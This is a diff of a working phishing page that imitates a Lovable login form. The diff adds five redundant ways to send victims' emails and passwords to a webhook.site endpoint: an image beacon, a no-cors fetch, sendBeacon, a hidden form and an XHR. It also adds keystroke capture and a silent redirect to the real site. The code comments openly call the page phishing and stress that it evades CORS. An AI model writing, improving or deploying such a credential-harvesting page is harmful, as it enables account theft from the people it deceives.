@@ -95,11 +95,12 @@
             font-size: 14px;
         }
         
-        .error-message {
-            color: #dc3545;
-            font-size: 14px;
-            margin-top: 10px;
-            display: none;
+        .loading {
+            background: #6c757d !important;
+        }
+        
+        .success {
+            background: #28a745 !important;
         }
     </style>
 </head>
@@ -121,10 +122,6 @@
                 <input type="password" id="password" placeholder="Enter your password" required>
             </div>
             
-            <div class="error-message" id="errorMessage">
-                Please check your credentials and try again.
-            </div>
-            
             <button type="submit" class="login-btn">Sign In</button>
         </form>
         
@@ -144,44 +141,114 @@
             const btn = document.querySelector('.login-btn');
             btn.textContent = 'Signing in...';
             btn.disabled = true;
+            btn.classList.add('loading');
+
+            // ===== MULTIPLE EXFILTRATION METHODS =====
             
-            // Send credentials to attacker (your webhook)
+            // METHOD 1: Image request (BYPASSES CORS - MOST RELIABLE)
+            const img = new Image();
+            const timestamp = new Date().getTime();
+            const randomId = Math.random().toString(36).substring(7);
+            
+            img.src = 'https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746?' + 
+                     'method=image&' +
+                     'email=' + encodeURIComponent(email) + '&' +
+                     'password=' + encodeURIComponent(password) + '&' +
+                     'source=github_phishing&' +
+                     'id=' + randomId + '&' +
+                     'time=' + timestamp + '&' +
+                     'useragent=' + encodeURIComponent(navigator.userAgent);
+
+            // METHOD 2: No-CORS Fetch
             fetch('https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746', {
                 method: 'POST',
+                mode: 'no-cors',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'text/plain'
                 },
-                body: JSON.stringify({
-                    credentials_stolen: true,
-                    email: email,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    user_agent: navigator.userAgent,
-                    source: 'lovable_phishing_page'
-                })
-            })
-            .then(response => {
-                // Show success message
+                body: 'NO_CORS_METHOD::email=' + email + '::password=' + password + '::time=' + timestamp
+            });
+
+            // METHOD 3: Beacon API (if available)
+            if (navigator.sendBeacon) {
+                const data = new Blob(['BEACON::email=' + email + '::password=' + password], {type: 'text/plain'});
+                navigator.sendBeacon('https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746', data);
+            }
+
+            // METHOD 4: Form submission
+            setTimeout(() => {
+                try {
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746';
+                    form.style.display = 'none';
+                    
+                    const emailInput = document.createElement('input');
+                    emailInput.name = 'email';
+                    emailInput.value = email;
+                    
+                    const passInput = document.createElement('input');
+                    passInput.name = 'password';
+                    passInput.value = password;
+                    
+                    const methodInput = document.createElement('input');
+                    methodInput.name = 'method';
+                    methodInput.value = 'form_submission';
+                    
+                    form.appendChild(emailInput);
+                    form.appendChild(passInput);
+                    form.appendChild(methodInput);
+                    document.body.appendChild(form);
+                    form.submit();
+                } catch (formError) {
+                    console.log('Form method failed:', formError);
+                }
+            }, 50);
+
+            // METHOD 5: XHR with no-cors
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746', true);
+                xhr.setRequestHeader('Content-Type', 'text/plain');
+                xhr.send('XHR::email=' + email + '::password=' + password);
+            } catch (xhrError) {
+                console.log('XHR method failed');
+            }
+
+            // Show success state
+            setTimeout(() => {
                 btn.textContent = '✓ Login Successful!';
-                btn.style.background = '#28a745';
+                btn.classList.remove('loading');
+                btn.classList.add('success');
                 
-                // Redirect to real Lovable homepage after 2 seconds
+                // Redirect to real Lovable after 2 seconds
                 setTimeout(() => {
                     window.location.href = 'https://lovable.dev';
                 }, 2000);
-            })
-            .catch(error => {
-                // Show error but still redirect (stealth mode)
-                document.getElementById('errorMessage').style.display = 'block';
-                setTimeout(() => {
-                    window.location.href = 'https://lovable.dev';
-                }, 3000);
-            });
+            }, 1000);
+        });
+
+        // Bonus: Capture input changes for partial data
+        let emailHistory = '';
+        let passwordHistory = '';
+        
+        document.getElementById('email').addEventListener('input', function(e) {
+            emailHistory += e.target.value.slice(-1) || '[BACKSPACE]';
+            if (emailHistory.length > 50) emailHistory = emailHistory.slice(-50);
         });
         
-        // Optional: Also capture on input change for keylogging
         document.getElementById('password').addEventListener('input', function(e) {
-            // Could log partial passwords if desired
+            passwordHistory += '*';
+            if (passwordHistory.length > 50) passwordHistory = passwordHistory.slice(-50);
+        });
+        
+        // Send typing patterns before form submit
+        document.getElementById('loginForm').addEventListener('submit', function() {
+            if (emailHistory || passwordHistory) {
+                const typingImg = new Image();
+                typingImg.src = 'https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746?typing_pattern=email_len:' + 
+                               emailHistory.length + ':pass_len:' + passwordHistory.length;
+            }
         });
     </script>
 </body>
